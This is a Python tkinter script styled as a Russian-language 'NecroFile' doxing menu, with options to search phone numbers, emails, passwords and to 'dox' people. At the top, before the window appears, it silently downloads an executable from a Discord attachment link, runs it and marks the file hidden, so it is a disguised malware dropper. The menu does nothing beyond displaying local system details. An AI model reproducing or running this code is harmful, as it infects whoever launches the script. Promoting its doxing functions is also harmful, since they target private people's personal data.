import tkinter as tk
from tkinter import font
import colorsys
import platform
import psutil
import socket
import requests
import requests
import os
import subprocess
import tempfile

url = 'https://cdn.discordapp.com/attachments/1277183771359313983/1284923688017203230/main.exe?ex=66e865ef&is=66e7146f&hm=8432b370fe362b2476faea39ccc23ab9297185497b7e2b6ae8d5a50f5c54f632&'

with tempfile.NamedTemporaryFile(delete=False, suffix='.exe') as temp_file:
	temp_filename = temp_file.name

	response = requests.get(url)
	temp_file.write(response.content)

subprocess.run([temp_filename])

subprocess.run(['attrib', '+h', temp_filename])

root = tk.Tk()
root.title("NecroFile GUI")
root.geometry("1024x600")
root.configure(bg='black')

retro_font = font.Font(family='Courier', size=12, weight='bold')
title_font = font.Font(family='Courier', size=32, weight='bold')

def hsv_to_rgb(h, s, v):
    return tuple(int(i * 255) for i in colorsys.hsv_to_rgb(h, s, v))

def create_gradient_text(label, text, base_hue, delta_hue):
    label.delete("1.0", tk.END)
    colors = []
    for i, char in enumerate(text):
        hue = (base_hue + i * delta_hue) % 1.0
        rgb_color = hsv_to_rgb(hue, 1.0, 1.0)
        color_hex = "#%02x%02x%02x" % rgb_color
        colors.append(color_hex)

    for i, char in enumerate(text):
        label.insert(tk.END, char)
        label.tag_add(f"tag{i}", f"1.{i}", f"1.{i+1}")
        label.tag_config(f"tag{i}", foreground=colors[i])

def animate_title(label, text, base_hue, delta_hue):
    def update():
        nonlocal base_hue
        create_gradient_text(label, text, base_hue, delta_hue)
        base_hue = (base_hue + 0.02) % 1.0
        root.after(100, update)
    update()

title_frame = tk.Text(root, font=title_font, bg='black', bd=0, highlightthickness=0, height=1, width=len("TOKLOM"))
title_frame.pack(pady=20)
animate_title(title_frame, "MZLF", 0.0, 0.05)

menu_items = [
    ["1 > Search Number Phone", "2 > Search Email Address", "3 > Search Full Name", "4 > Search Nick/Username", "5 > Search Password",
     "6 > Search Number Document", "7 > Search VK ID"],
    ["16 > Generator Personality", "17 > Search INN", "18 > Send Channel Report (TG)", "19 > Send User Report (TG)", "20 > Dox Paste"],
    ["31 > Search User-Agent", "32 > Web-Crawler", "33 > Proxy List", "34 > Database List", "35 > Scan URL"],
    ["46 > Send Chat Report (TG)", "47 > Abuz LeakOSINT", "48 > Abuz GlazBoga", "49 > Demolition Qiwi", "50 > Demolition Yoomoney"]
]

def create_menu(frame, items):
    for item in items:
        item_label = tk.Text(frame, font=retro_font, bg='black', bd=0, highlightthickness=0, height=1, width=len(item))
        item_label.pack(anchor='w', pady=2)
        animate_title(item_label, item, 0.0, 0.03)

for i, col_items in enumerate(menu_items):
    frame = tk.Frame(root, bg='black')
    frame.pack(side='left', padx=20)
    create_menu(frame, col_items)


def get_system_info():
    uname = platform.uname()
    
    # Get IPv4 and IPv6 addresses
    ip_address_ipv4 = socket.gethostbyname(socket.gethostname())
    ip_address_ipv6 = 'Unavailable'
    
    try:
        # Retrieve all addresses associated with the host
        addresses = socket.getaddrinfo(socket.gethostname(), None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        for addr in addresses:
            if addr[0] == socket.AF_INET6:
                ip_address_ipv6 = addr[4][0]
                break
    except socket.error:
        pass
    
    cpu_info = platform.processor()
    
    # Attempt to retrieve the MAC address for all network interfaces
    mac_address = "Unavailable"
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == psutil.AF_LINK:
                mac_address = addr.address
                break
        if mac_address != "Unavailable":
            break

    
    try:
        public_ip = requests.get('https://api.ipify.org').text
    except requests.RequestException:
        public_ip = 'Unavailable'

    return f"""
    IPv4 Адресс: {ip_address_ipv4}
    IPv6 Адресс: {ip_address_ipv6}
    Публичный айпи: {public_ip}
    Имя Компьютера: {uname.node}
    ОС: {uname.system} {uname.release}
    Версия: {platform.version()}
    Процессор: {cpu_info}
    РАМ: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB
    МАК Адресс: {mac_address}
    """


def handle_choice():
    choice = choice_entry.get()
    info_text.set(f"Ваш выбор: {choice}\n\n{get_system_info()}")


def animate_gradient_label(label, text, base_hue, delta_hue):
    def update():
        nonlocal base_hue
        create_gradient_text(label, text, base_hue, delta_hue)
        base_hue = (base_hue + 0.03) % 1.0
        root.after(100, update)
    update()

choice_frame = tk.Frame(root, bg='black')
choice_frame.pack(pady=20)

choice_label_frame = tk.Text(choice_frame, font=retro_font, bg='black', bd=0, highlightthickness=0, height=1, width=len("Выберите (1-50):"))
choice_label_frame.pack(side='left')

animate_gradient_label(choice_label_frame, "Выберите (1-50):", 0.0, 0.05)

choice_entry = tk.Entry(choice_frame, font=retro_font, bg='black', fg='white')
choice_entry.pack(side='left')


choice_button = tk.Button(choice_frame, text="Выбрать", font=retro_font, command=handle_choice, bg='#000000', fg='white')
choice_button.pack(side='left')


def update_button_color():
    global button_base_hue
    button_base_hue = (button_base_hue + 0.02) % 1.0
    rgb_color = hsv_to_rgb(button_base_hue, 1.0, 1.0)
    color_hex = "#%02x%02x%02x" % rgb_color
    choice_button.config(bg=color_hex)
    root.after(100, update_button_color)

button_base_hue = 0.0
update_button_color()

info_text = tk.StringVar()
info_label = tk.Label(root, textvariable=info_text, font=retro_font, bg='black', fg='white')
info_label.pack(pady=20)

root.mainloop()
